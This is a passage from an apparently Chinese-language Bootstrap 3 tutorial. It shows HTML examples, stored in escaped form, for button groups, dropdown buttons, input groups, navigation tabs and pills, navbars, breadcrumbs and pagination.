btn-default\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;按钮 \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;1\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;2\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;3\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   垂直的按钮组  \u0026lt;div class=\u0026quot;btn-group-vertical\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;按钮 \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;1\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;2\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;3\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   两端对齐排列的按钮组  \u0026lt;div class=\u0026quot;btn-group btn-group-justified\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;right\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;btn-group btn-group-justified\u0026quot;\u0026gt; \u0026lt;!--\u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt;--\u0026gt; 为了浏览器兼容问题使用btn-group包裹 \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;btn btn-default\u0026quot;\u0026gt;left\u0026lt;/a\u0026gt; \u0026lt;!--\u0026lt;/div\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt;--\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/a\u0026gt; \u0026lt;!--\u0026lt;/div\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt;--\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;btn btn-default\u0026quot;\u0026gt;right\u0026lt;/a\u0026gt; \u0026lt;!--\u0026lt;/div\u0026gt;--\u0026gt; \u0026lt;/div\u0026gt;   按钮式下拉菜单\n 单按钮下拉菜单 btn-default btn-success btn-primary btn-info btn-danger btn-warning\n  \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;Default \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;html\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;javascript\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;jQuery\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt;   分裂式按钮下拉菜单  \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;Default\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;\u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;html\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;javascript\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;jQuery\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt;   按钮下拉菜单的大小 btn-lg btn-sm btn-xs  \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default btn-lg dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;Default \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;html\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;javascript\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;jQuery\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt;   向上弹出式菜单 dropup  \u0026lt;div class=\u0026quot;btn-group dropup\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default btn-lg dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;Default \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;html\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;javascript\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;jQuery\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt;   输入框\n 基本的输入框组\n  \u0026lt;form action=\u0026quot;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;input-group-addon\u0026quot;\u0026gt;@\u0026lt;/span\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot;/\u0026gt; \u0026lt;span class=\u0026quot;input-group-addon\u0026quot;\u0026gt;.00\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;input-group-addon\u0026quot;\u0026gt;$\u0026lt;/span\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot;/\u0026gt; \u0026lt;span class=\u0026quot;input-group-addon\u0026quot;\u0026gt;.00\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt;   输入框组的大小 input-group-lg input-group-xs input-group-sm  \u0026lt;form action=\u0026quot;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group input-group-lg\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;input-group-addon\u0026quot;\u0026gt;@\u0026lt;/span\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt;   复选框和单选框插件  \u0026lt;form action=\u0026quot;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-md-6\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;input-group-addon\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;checkbox\u0026quot;/\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt;   按钮插件 input-group-btn  \u0026lt;form action=\u0026quot;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-md-6\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;input-group-btn\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;Go\u0026lt;/button\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;input class=\u0026quot;form-control\u0026quot; type=\u0026quot;text\u0026quot;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt;   按钮式下拉菜单  \u0026lt;form action=\u0026quot;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-md-6\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group-btn\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;dropdown\u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;资讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;新闻\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;关于\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;input class=\u0026quot;form-control\u0026quot; type=\u0026quot;text\u0026quot;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt;   分裂式按钮下拉菜单  \u0026lt;form action=\u0026quot;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-md-6\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group-btn\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;dropdown\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;资讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;新闻\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;关于\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;input class=\u0026quot;form-control\u0026quot; type=\u0026quot;text\u0026quot;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt;  七、导航、导航条、面包屑导航组件 导航（标签） nav\n 标签页 nav-tabs  \u0026lt;ul class=\u0026quot;nav nav-tabs\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Message\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   胶囊式标签页 nav-pills  \u0026lt;ul class=\u0026quot;nav nav-pills\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Message\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   垂直的胶囊式标签页 nav-stacked  \u0026lt;ul class=\u0026quot;nav nav-pills nav-stacked\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Message\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   两端对齐的标签页 nav-justified  \u0026lt;ul class=\u0026quot;nav nav-pills nav-justified\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Message\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   禁用链接 disabled  \u0026lt;ul class=\u0026quot;nav nav-tabs\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;disabled\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Message\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   带有下拉菜单的标签  \u0026lt;ul class=\u0026quot;nav nav-tabs\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;dropdown\u0026quot;\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;Message \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;关于\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;资讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;通讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   带下拉菜单的胶囊式标签  \u0026lt;ul class=\u0026quot;nav nav-pills\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;dropdown\u0026quot;\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;Message \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;关于\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;资讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;通讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;  导航条 navbar \u0026lt;nav\u0026gt;标签中添加 class .navbar、.navbar-default\n 默认的导航栏  \u0026lt;nav class=\u0026quot;navbar navbar-default\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;navbar-header\u0026quot;\u0026gt; \u0026lt;a class=\u0026quot;navbar-brand\u0026quot; href=\u0026quot;\u0026quot;\u0026gt;poetries blog\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026quot;nav navbar-nav\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;dropdown\u0026quot;\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;Message \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;关于\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;资讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;通讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt;   响应式的导航栏  \u0026lt;nav class=\u0026quot;navbar navbar-default\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;navbar-header\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;navbar-toggle\u0026quot; data-toggle=\u0026quot;collapse\u0026quot; data-target=\u0026quot;#navbar-collapse\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;icon-bar\u0026quot;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;icon-bar\u0026quot;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;icon-bar\u0026quot;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;a class=\u0026quot;navbar-brand\u0026quot; href=\u0026quot;\u0026quot;\u0026gt;教育\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;collapse navbar-collapse\u0026quot; id=\u0026quot;navbar-collapse\u0026quot;\u0026gt; \u0026lt;ul class=\u0026quot;nav navbar-nav\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;dropdown\u0026quot;\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;Message \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;关于\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;资讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;通讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt;   导航栏中的表单  \u0026lt;form action=\u0026quot;\u0026quot; class=\u0026quot;navbar-form navbar-right\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;form-group\u0026quot;\u0026gt; \u0026lt;input class=\u0026quot;form-control\u0026quot; type=\u0026quot;text\u0026quot; placeholder=\u0026quot;Search\u0026quot;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;Search\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt;   导航栏中的按钮 navbar-btn  \u0026lt;button class=\u0026quot;btn btn-default navbar-btn\u0026quot;\u0026gt;Submit\u0026lt;/button\u0026gt;   导航栏中的文本 navbar-text  \u0026lt;p class=\u0026quot;navbar-text\u0026quot;\u0026gt;Signed in as Thomas\u0026lt;/p\u0026gt;   固定到顶部、底部 navbar-fixed-top navbar-fixed-bottom  \u0026lt;nav class=\u0026quot;navbar navbar-default navbar-fixed-top\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;navbar-header\u0026quot;\u0026gt; \u0026lt;a class=\u0026quot;navbar-brand\u0026quot; href=\u0026quot;\u0026quot;\u0026gt;教育\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026quot;nav navbar-nav\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Project\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;dropdown\u0026quot;\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;Message \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;关于\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;资讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;通讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt;   静态的顶部 navbar-static-top\n 倒置的导航栏 带有黑色背景白色文本的倒置的导航栏 navbar-inverse\n 面包屑导航\n  \u0026lt;ul class=\u0026quot;breadcrumb\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;首页\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;列表\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;详情\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;  八、分页、标签、徽章、巨幕、页头、缩略图、警告框组件 分页\n 默认的分页  \u0026lt;ul class=\u0026quot;pagination\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;«\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;1\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;2\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;3\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;»\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; 